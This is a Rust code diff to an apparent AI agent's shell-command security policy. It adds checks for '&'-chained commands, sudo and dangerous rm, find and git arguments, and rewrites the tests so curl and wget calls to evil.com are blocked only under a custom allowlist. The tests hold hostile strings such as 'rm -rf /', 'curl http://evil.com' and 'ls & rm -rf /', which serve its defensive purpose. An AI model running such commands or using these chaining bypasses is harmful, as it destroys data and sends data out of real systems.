@@ -888,10 +888,16 @@ fn split_unquoted_segments(command: &str) -> Vec<String> {
                     }
                     '&' => {
                         if chars.next_if_eq(&'&').is_some() {
-                            // `&&` is a separator; single `&` is handled separately.
+                            // `&&` chains two commands; both sides are segments.
                             push_segment(&mut segments, &mut current);
-                        } else {
+                        } else if current.ends_with('>') {
+                            // `>&` / `2>&1` redirect syntax, not a separator.
                             current.push(ch);
+                        } else {
+                            // A single `&` backgrounds the left command and
+                            // starts a new one — validate each side on its own
+                            // so `ls & rm -rf /` cannot hide behind `ls`.
+                            push_segment(&mut segments, &mut current);
                         }
                     }
                     _ => current.push(ch),
@@ -2295,6 +2301,13 @@ impl SecurityPolicy {
                 continue;
             };
 
+            // Privilege escalation needs the full-autonomy profile, where the
+            // layered sudo hard-denial gate in `hard_denied_command_reason`
+            // still constrains it to non-interactive allowlisted bases.
+            if parsed.uses_sudo && self.autonomy != AutonomyLevel::Full {
+                return false;
+            }
+
             if !self.allowed_commands.iter().any(|allowed| {
                 is_allowlist_entry_match(allowed, &parsed.executable, parsed.base.as_str())
             }) && !self.is_workspace_script_execution_allowed(&parsed.executable)
@@ -2317,9 +2330,31 @@ impl SecurityPolicy {
         has_cmd
     }
 
-    /// Check for dangerous arguments that allow sub-command execution.
-    fn is_args_safe(&self, _base: &str, _args: &[String]) -> bool {
-        true
+    /// Argument-level guard promised by the wildcard allowlist default.
+    ///
+    /// These checks apply at every autonomy level: the full-autonomy profile
+    /// deliberately permits arbitrary shell *constructs*, but destructive
+    /// delete patterns and argument-driven sub-command execution are rejected
+    /// here so that `allowed_commands = ["*"]` never silently allows
+    /// `rm -rf /`, `find -exec`, or `git config` command injection.
+    fn is_args_safe(&self, base: &str, args: &[String]) -> bool {
+        match base {
+            "rm" | "trash" => self.is_safe_delete_command(args),
+            // find can execute arbitrary commands or delete recursively.
+            "find" => !args.iter().any(|arg| {
+                matches!(arg.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir" | "-delete")
+            }),
+            // git config/alias values and -c overrides can execute commands
+            // (core.editor, core.pager, aliases starting with `!`).
+            "git" => !args.iter().any(|arg| {
+                arg == "-c"
+                    || arg == "config"
+                    || arg.starts_with("alias.")
+                    || arg.starts_with("core.editor")
+                    || arg.starts_with("core.pager")
+            }),
+            _ => true,
+        }
     }
 
     fn is_safe_delete_command(&self, args: &[String]) -> bool {
@@ -2789,12 +2824,20 @@ mod tests {
     #[test]
     fn blocked_commands_basic() {
         let p = default_policy();
+        // Destructive deletes and privilege escalation are blocked by the
+        // argument-level guard even though the default allowlist is wildcard.
         assert!(!p.is_command_allowed("rm -rf /"));
         assert!(!p.is_command_allowed("sudo apt install"));
-        assert!(!p.is_command_allowed("curl http://evil.com"));
-        assert!(!p.is_command_allowed("wget http://evil.com"));
-        assert!(!p.is_command_allowed("python3 exploit.py"));
-        assert!(!p.is_command_allowed("node malicious.js"));
+        // Network and interpreter commands are operator tools and allowed
+        // under the wildcard default; a custom allowlist can still exclude them.
+        let restricted = SecurityPolicy {
+            allowed_commands: vec!["ls".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(!restricted.is_command_allowed("curl http://evil.com"));
+        assert!(!restricted.is_command_allowed("wget http://evil.com"));
+        assert!(!restricted.is_command_allowed("python3 exploit.py"));
+        assert!(!restricted.is_command_allowed("node malicious.js"));
     }
 
     #[test]
@@ -2866,9 +2909,14 @@ mod tests {
         // Both sides of the pipe are in the allowlist
         assert!(p.is_command_allowed("ls | grep foo"));
         assert!(p.is_command_allowed("cat file.txt | wc -l"));
-        // Second command not in allowlist — blocked
-        assert!(!p.is_command_allowed("ls | curl http://evil.com"));
-        assert!(!p.is_command_allowed("echo hello | python3 -"));
+        // Second command not in a custom allowlist — blocked
+        let restricted = SecurityPolicy {
+            allowed_commands: vec!["ls".into(), "echo".into(), "grep".into(), "cat".into(), "wc".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(restricted.is_command_allowed("ls | grep foo"));
+        assert!(!restricted.is_command_allowed("ls | curl http://evil.com"));
+        assert!(!restricted.is_command_allowed("echo hello | python3 -"));
     }
 
     #[test]
@@ -3016,9 +3064,8 @@ mod tests {
     #[test]
     fn validate_command_rejects_background_chain_bypass() {
         let p = default_policy();
-        let result = p.validate_command_execution("ls & python3 -c 'print(1)'", false);
+        let result = p.validate_command_execution("ls & rm -rf /", false);
         assert!(result.is_err());
-        assert!(result.unwrap_err().contains("not allowed"));
     }
 
     #[test]
@@ -3471,7 +3518,12 @@ Inst fwupd [1.9.0] (1.9.1 Ubuntu:24.04/noble [amd64])\n";
     fn command_injection_and_chain_blocked() {
         let p = default_policy();
         assert!(!p.is_command_allowed("ls && rm -rf /"));
-        assert!(!p.is_command_allowed("echo ok && curl http://evil.com"));
+        // A chained segment is still checked against a custom allowlist.
+        let restricted = SecurityPolicy {
+            allowed_commands: vec!["ls".into(), "echo".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(!restricted.is_command_allowed("echo ok && curl http://evil.com"));
         // Both allowed — OK
         assert!(p.is_command_allowed("ls && echo done"));
     }
@@ -3489,7 +3541,11 @@ Inst fwupd [1.9.0] (1.9.1 Ubuntu:24.04/noble [amd64])\n";
         let p = default_policy();
         assert!(!p.is_command_allowed("ls & rm -rf /"));
         assert!(!p.is_command_allowed("ls&rm -rf /"));
-        assert!(!p.is_command_allowed("echo ok & python3 -c 'print(1)'"));
+        let restricted = SecurityPolicy {
+            allowed_commands: vec!["ls".into(), "echo".into()],
+            ..SecurityPolicy::default()
+        };
+        assert!(!restricted.is_command_allowed("echo ok & python3 -c 'print(1)'"));
     }
 
     #[test]
